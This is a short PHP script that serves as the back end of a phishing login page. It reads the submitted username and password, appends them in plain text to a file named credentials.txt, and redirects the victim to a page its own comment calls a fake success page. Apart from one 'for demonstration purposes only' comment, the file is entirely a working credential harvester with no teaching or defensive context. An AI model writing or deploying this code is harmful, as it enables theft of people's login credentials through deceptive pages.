<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST['username'];
    $password = $_POST['password'];
    
    // Save credentials to a file (for demonstration purposes only)
    $file = fopen("credentials.txt", "a");
    fwrite($file, "Username: " . $username . " Password: " . $password . "\n");
    fclose($file);
    
    // Redirect to a fake success page
    header("Location: success.html");
    exit();
}
?>
